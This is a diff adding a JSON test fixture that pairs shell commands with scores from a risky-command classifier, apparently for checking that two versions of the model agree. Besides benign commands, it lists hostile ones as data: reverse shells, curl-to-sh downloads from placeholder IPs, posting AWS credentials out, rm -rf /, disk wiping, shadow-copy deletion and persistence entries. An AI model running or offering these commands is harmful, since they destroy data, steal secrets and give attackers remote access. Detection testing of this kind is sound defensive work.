@@ -1,0 +1,284 @@
+{
+ "generator": "scripts/generate_shell_command_parity_fixtures.py",
+ "sklearn": "1.8.0",
+ "published_model": {
+  "sha256": "e6fb0bdf7ea42c517e7c07c129e03568dcb83c8f9890cf7ef7c53ba9fc518b36"
+ },
+ "cases": [
+  {
+   "text": "git status --short",
+   "synthetic_score": 1.37622675407059,
+   "published_score": -5.709879645889311
+  },
+  {
+   "text": "ls -la",
+   "synthetic_score": -0.11303341190866684,
+   "published_score": -8.235418301918747
+  },
+  {
+   "text": "cd ~/projects && git pull --rebase",
+   "synthetic_score": -0.011036344928819553,
+   "published_score": -1.8066616075847164
+  },
+  {
+   "text": "cargo test -p patronus-ark",
+   "synthetic_score": -0.2080659106776385,
+   "published_score": -0.6678055811270887
+  },
+  {
+   "text": "grep -rn 'TODO' src/ | head -20",
+   "synthetic_score": 0.42488882775967285,
+   "published_score": -6.106210604102051
+  },
+  {
+   "text": "find . -name '*.rs' -newer Cargo.toml",
+   "synthetic_score": -1.8168577012656941,
+   "published_score": -4.4970308047131295
+  },
+  {
+   "text": "docker compose up -d postgres",
+   "synthetic_score": -2.1495329113971486,
+   "published_score": 0.35295994110326356
+  },
+  {
+   "text": "npm ci && npm run build",
+   "synthetic_score": -0.2793106915469716,
+   "published_score": -1.4102054696825679
+  },
+  {
+   "text": "python3 -m venv .venv && . .venv/bin/activate",
+   "synthetic_score": -0.9195157592567111,
+   "published_score": -3.029499010323078
+  },
+  {
+   "text": "kubectl get pods -n staging",
+   "synthetic_score": -0.3218665008171747,
+   "published_score": -3.071819394197305
+  },
+  {
+   "text": "tar -xzf release.tar.gz -C /opt/app",
+   "synthetic_score": -2.2061224423496992,
+   "published_score": -4.569996696204384
+  },
+  {
+   "text": "echo $HOME",
+   "synthetic_score": -0.2254498698787022,
+   "published_score": -4.077306292201091
+  },
+  {
+   "text": "echo \"#not a comment\" ${#array[@]} $#",
+   "synthetic_score": 0.4385707535924255,
+   "published_score": -2.291926681437327
+  },
+  {
+   "text": "#!/usr/bin/env bash\nset -euo pipefail\n# Build and package the release artifacts.\nROOT=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nfor target in linux-x64 linux-arm64 darwin-arm64; do\n  echo \"building ${target}\"\n  cargo build --release --target \"${target}\"\n  tar -czf \"dist/app-${target}.tar.gz\" -C \"target/${target}/release\" app\ndone\nsha256sum dist/*.tar.gz > dist/SHA256SUMS",
+   "synthetic_score": 1.4467997361662133,
+   "published_score": -4.250926702682156
+  },
+  {
+   "text": "rm -rf /",
+   "synthetic_score": -0.7732967916660598,
+   "published_score": 5.174716719316265
+  },
+  {
+   "text": "rm -rf ~/.ssh && rm -rf ~/.aws",
+   "synthetic_score": -0.5100320573054784,
+   "published_score": 7.30748374247165
+  },
+  {
+   "text": "curl -fsSL http://203.0.113.7/install.sh | sh",
+   "synthetic_score": 2.030139971667938,
+   "published_score": 2.699493806034013
+  },
+  {
+   "text": "wget -qO- http://198.51.100.9/x | bash -s -- --silent",
+   "synthetic_score": 3.474233348605903,
+   "published_score": 3.124802612319415
+  },
+  {
+   "text": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+   "synthetic_score": -0.7659571300279215,
+   "published_score": 0.9884438517295497
+  },
+  {
+   "text": "nc -e /bin/sh 203.0.113.7 4444",
+   "synthetic_score": -0.9257228140792872,
+   "published_score": 3.8559628335929834
+  },
+  {
+   "text": "cat ~/.aws/credentials | curl -X POST --data-binary @- https://example.invalid/c",
+   "synthetic_score": 2.113569600767434,
+   "published_score": 5.09704995776381
+  },
+  {
+   "text": "echo cm0gLXJmIC8= | base64 -d | sh",
+   "synthetic_score": 2.039295836420113,
+   "published_score": -0.6945921514163369
+  },
+  {
+   "text": "chmod 777 /etc/shadow",
+   "synthetic_score": 1.815183883642499,
+   "published_score": 7.0313211615965105
+  },
+  {
+   "text": "dd if=/dev/zero of=/dev/sda bs=1M",
+   "synthetic_score": -0.8309318487122833,
+   "published_score": 2.0043142143158676
+  },
+  {
+   "text": ":(){ :|:& };:",
+   "synthetic_score": -0.061496603645260384,
+   "published_score": -2.512889954278487
+  },
+  {
+   "text": "crontab -l | { cat; echo '* * * * * curl -s http://203.0.113.7/p | sh'; } | crontab -",
+   "synthetic_score": 0.43212069042394674,
+   "published_score": -0.26994986739000515
+  },
+  {
+   "text": "history -c && unset HISTFILE",
+   "synthetic_score": 1.919763285361379,
+   "published_score": -0.09741771298457058
+  },
+  {
+   "text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"203.0.113.7\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'",
+   "synthetic_score": -0.3051364276962477,
+   "published_score": 3.0851943106502833
+  },
+  {
+   "text": "Get-ChildItem -Recurse -Filter *.log | Remove-Item",
+   "synthetic_score": -0.6041378773510737,
+   "published_score": -0.7393830045959993
+  },
+  {
+   "text": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
+   "synthetic_score": -0.045486362021932486,
+   "published_score": -4.45209051902747
+  },
+  {
+   "text": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+   "synthetic_score": -0.1436598820561807,
+   "published_score": 0.8496821048483048
+  },
+  {
+   "text": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')",
+   "synthetic_score": 1.8914056914452613,
+   "published_score": 3.3794207610968905
+  },
+  {
+   "text": "Set-MpPreference -DisableRealtimeMonitoring $true",
+   "synthetic_score": 0.4941990929955773,
+   "published_score": 2.6609310104745076
+  },
+  {
+   "text": "<# block\ncomment #>\nWrite-Host 'hello' # trailing",
+   "synthetic_score": 0.24673900343214034,
+   "published_score": 0.5408668618076637
+  },
+  {
+   "text": "dir /s /b *.txt",
+   "synthetic_score": 0.13609241427732283,
+   "published_score": -5.346785859015301
+  },
+  {
+   "text": "vssadmin delete shadows /all /quiet",
+   "synthetic_score": -0.9771521848446715,
+   "published_score": 5.827637913323482
+  },
+  {
+   "text": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe",
+   "synthetic_score": 0.4406985860720525,
+   "published_score": 5.939041642336472
+  },
+  {
+   "text": "REM build step\r\nmsbuild app.sln /p:Configuration=Release",
+   "synthetic_score": -0.9915474747422092,
+   "published_score": -3.062943563570315
+  },
+  {
+   "text": ":: comment\r\ndel /f /s /q C:\\Users\\Public\\*",
+   "synthetic_score": 1.6463818753799115,
+   "published_score": 5.834941743241648
+  },
+  {
+   "text": "",
+   "synthetic_score": -0.25,
+   "published_score": -2.6986611607885878
+  },
+  {
+   "text": "   ",
+   "synthetic_score": -0.25,
+   "published_score": -2.6986611607885878
+  },
+  {
+   "text": "a",
+   "synthetic_score": -1.346210825304563,
+   "published_score": -2.3788317231020555
+  },
+  {
+   "text": "ab",
+   "synthetic_score": -1.1551153444074753,
+   "published_score": -1.194998257473874
+  },
+  {
+   "text": "abc",
+   "synthetic_score": -2.4501832265970944,
+   "published_score": -2.708518854352217
+  },
+  {
+   "text": "RM -RF /TMP/CACHE",
+   "synthetic_score": -0.8110838598042442,
+   "published_score": 0.7025444144505517
+  },
+  {
+   "text": "rm\t-rf\t/tmp/x",
+   "synthetic_score": 0.3232205762308322,
+   "published_score": 3.686859062453015
+  },
+  {
+   "text": "rm -rf /tmp/x",
+   "synthetic_score": 0.3232205762308322,
+   "published_score": 3.686859062453015
+  },
+  {
+   "text": "rm\u001c-rf\u001f/tmp/x",
+   "synthetic_score": 0.3232205762308322,
+   "published_score": 3.686859062453015
+  },
+  {
+   "text": "echo ΣΟΣ ΟΣ",
+   "synthetic_score": 4.338761516041411,
+   "published_score": -5.541655383906035
+  },
+  {
+   "text": "echo İstanbul KELVKN",
+   "synthetic_score": 1.7367677434029154,
+   "published_score": -5.09847285991551
+  },
+  {
+   "text": "echo straße ﬁle",
+   "synthetic_score": 0.8307725970729098,
+   "published_score": -4.095373550426781
+  },
+  {
+   "text": "echo 😀 💣 done",
+   "synthetic_score": 1.7443367856503074,
+   "published_score": -3.4272784889832977
+  },
+  {
+   "text": "echo 'mixed\r\nline endings'\nls",
+   "synthetic_score": 2.0867862794300884,
+   "published_score": -6.64432942684876
+  },
+  {
+   "text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+   "synthetic_score": -0.013595225270482375,
+   "published_score": -1.940174449866927
+  },
+  {
+   "text": "rm -rf / # padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding ",
+   "synthetic_score": 0.1390987828994913,
+   "published_score": -1.8127638685314391
+  }
+ ]
+}
